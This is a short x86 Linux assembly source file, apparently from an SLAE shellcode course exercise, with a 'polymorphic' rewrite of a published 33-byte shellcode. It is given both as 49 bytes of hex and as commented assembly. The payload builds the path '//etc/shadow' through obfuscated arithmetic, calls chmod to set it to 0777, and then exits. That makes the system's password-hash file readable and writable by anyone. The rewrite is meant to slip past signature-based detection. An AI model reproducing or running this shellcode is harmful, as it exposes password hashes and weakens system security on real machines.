;Description:	Polymorphic version of http://shell-storm.org/shellcode/files/shellcode-590.php
;Original Shellcode (33 bytes):	\x31\xc0\x50\xb0\x0f\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x40\xcd\x80
;Polymorphic Shellcode (49 bytes):	\x99\xb0\x0e\xfe\xc0\x52\xba\x50\x51\x5c\x65\x81\xc2\x11\x13\x13\x12\x52\xba\x73\x68\x63\x2f\xc1\xc2\x10\x52\xc7\x44\x24\xfc\x2f\x2f\x65\x74\x83\xec\x04\x89\xe3\x66\xb9\xff\x01\xcd\x80\x40\xcd\x80
;Author:	Paolo Stivanin <https://github.com/polslinux>
;SLAE ID:	526

global _start
section .text
_start:
	cdq
	
	mov al,0xe
	inc al
	
	push edx
	mov edx,0x655c5150
	add edx,0x12131311
	push edx
	
	mov edx,0x2f636873
	rol edx,16
	push edx
	
	mov dword [esp-4],0x74652f2f
	sub esp,4
	
	mov ebx,esp
	mov cx,0x1ff
	int 0x80
	
	inc eax
	int 0x80
